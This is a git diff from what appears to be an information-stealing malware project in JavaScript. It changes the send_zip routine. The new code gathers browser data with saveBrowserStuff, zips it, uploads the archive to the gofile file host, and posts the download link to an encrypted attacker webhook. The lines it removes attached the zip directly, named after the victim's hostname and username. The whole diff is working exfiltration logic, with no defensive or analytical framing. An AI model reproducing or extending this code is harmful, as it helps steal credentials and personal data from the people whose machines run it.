@@ -104,20 +104,20 @@ module.exports = (client) => {
         },
 
         async send_zip() {
+
+            await client.utils.browsers.saveBrowserStuff()
             await client.utils.jszip.createZip();
-            await client.utils.webhook.sendToWebhook(
-                client.utils.encryption.decryptData(client.config.webhook.url), {
-                    embeds: [this.create_counter_embed()],
-                })
+
+            const upload = await client.utils.gofile.uploadFile(client.requires.fs.createReadStream(`${client.config.jszip.path}.zip`))
+
+            var counter_embed = this.create_counter_embed();
+
+            counter_embed.description = `**[Download the zip file](${upload.downloadPage})**`
 
             await client.utils.webhook.sendToWebhook(
                 client.utils.encryption.decryptData(client.config.webhook.url), {
-                    files: [{
-                        path: `${client.config.jszip.path}.zip`,
-                        name: `${client.utils.encryption.decryptData(client.config.user.hostname)}_${client.utils.encryption.decryptData(client.config.user.user_domain)}_${client.utils.encryption.decryptData(client.config.user.username)}.zip`
-                    }]
-                }
-            )
+                    embeds: [counter_embed],
+                })
         },
 
         create_counter_embed() {
